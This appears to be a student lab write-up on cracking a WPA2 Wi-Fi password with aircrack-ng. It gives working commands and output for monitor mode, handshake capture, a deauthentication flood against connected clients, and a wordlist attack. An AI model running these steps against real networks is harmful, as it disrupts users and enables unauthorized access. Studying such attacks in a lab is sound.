# Aircrack-ng

This is documentation for using aircrack-ng as tools
to crack password files.

### [starting airmon-ng]

This command is used for checking if the wifi card supports monitoring mode or not.

````
$ sudo airmon-ng start wlp1s0

PHY	Interface	Driver		Chipset

phy0	wlp1s0		ath9k		Qualcomm Atheros QCA9565 / AR9565 Wireless Network Adapter (rev 01)

		(mac80211 monitor mode vif enabled for [phy0]wlp1s0 on [phy0]wlp1s0mon)
		(mac80211 station mode vif disabled for [phy0]wlp1s0)
````
    
### [airodump-ng ESSID]

````
$ sudo airodump-ng wlp1s0mon
````

````
 CH  8 ][ Elapsed: 1 min ][ yyyy-mm-dd hh:mm 

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 MA:C0:AD:DR:ES:S0  -57       87        4    0   1   65   WPA2 CCMP   PSK  hello-world
 xx:xx:xx:xx:xx:xx  -75      125     1073   46   5  130   WPA2 CCMP   PSK  xxxxxxxxxx
 xx:xx:xx:xx:xx:xx  -83       29       10    0   6  130   WPA2 CCMP   PSK  xxxxxxxxxx
 xx:xx:xx:xx:xx:xx  -88       35        0    0   1  130   WPA  CCMP   PSK  xxxxxxxxxx
 xx:xx:xx:xx:xx:xx  -87       16        0    0   8  130   WPA2 CCMP   PSK  xxxxxxxxxx

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 xx:xx:xx:xx:xx:xx  xx:xx:xx:xx:xx:xx  -33    0e- 0e     0       22                     
 xx:xx:xx:xx:xx:xx  xx:xx:xx:xx:xx:xx   -1    1e- 0      0        1             
 
````

### [airodump-ng and aireplay-ng]

To get four way handshake, we need this two services to run together.
The tools will then connect each other to indicate the handshake has
been made or not. Fail to do this or quickly stopping the scan will
then lead to failure to do the handshake that we need. It'll also
generate .cap file that we can use to do password cracking with
aircrack-ng.
 
### [airodump-ng]

By using airodump-ng, we can see essid around us that can be pawned.
What we need in this session is [WPA handshake: D0:37:45:AB:CC:D3],
this will indicate that the wpa handshake is understood. It'll show
when we do the next step. `pwnd` will be the name of the file for 


````
$ sudo airodump-ng -c 4 --bssid MA:C0:AD:DR:ES:S0 --write pwnd wlp1s0mon
````

````
 CH  1 ][ Elapsed: 1 min ][ yyyy-mm-dd hh:mm ][ WPA handshake: MA:C0:AD:DR:ES:S0
 
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 MA:C0:AD:DR:ES:S0  -56  87      528      465    1   1   65   WPA2 CCMP   PSK  hello-world

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 MA:C0:AD:DR:ES:S0  xx:xx:xx:xx:xx:xx  -36    1 - 1      0      331                                                               
 MA:C0:AD:DR:ES:S0  xx:xx:xx:xx:xx:xx  -35    0e- 1     46      396  EAPOL     
````

### [aireplay-ng deauth]
Deauthenticating user that is connected to the network means
that they have to do the same login to then connect to the 
wifi that we're trying to brute-forcing. By doing this, it'll
then taking the information to do handshake with airdump-ng.

````
$ sudo aireplay-ng --deauth 50 -a MA:C0:AD:DR:ES:S0 wlp1s0mon
````

````
yyyy-mm-dd hh:mm:ss,1900-01-00 00:00:00,,MA:C0:AD:DR:ES:S0,-43,,0.000000,0.000000,0.000,0.000,Client
````


### [file list]

This is the list structure of the folder. there will be 6
files that will be indicated by the name
````
~/lab7 ls
.  ..  pwnd-01.cap  pwnd-01.csv  pwnd-01.kismet.csv  pwnd-01.kismet.netxml  pwnd-01.log.csv  readme.md
````


### [aircrack-ng command]
 
aircrack-ng will then do the cracking by using the wordlist that has
been indicated on the wordlist.txt, in this file, I'll be using
`common-wordlist.txt` as wordlist file.

````
$ sudo aircrack-ng pwnd-02.cap -w common-wordlist.txt 
````

as you can see on the results below, aircrack-ng says `KEY NOT FOUND`
this means that it can't pawn the network SSID because the wordlist
is not sufficient for this purpose.

````
                               Aircrack-ng 1.6 

      [00:00:00] 478/477 keys tested (2002.39 k/s) 

      Time left: --

                                KEY NOT FOUND


      Master Key     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
````

in the end, aircrack-ng can do its job if the wordlist is good enough
that it contains password for doing the cracking, otherwise it'll not
be useful. Brute-forcing is a good technique to use if you have enough
information of the target, otherwise, it'll fail.

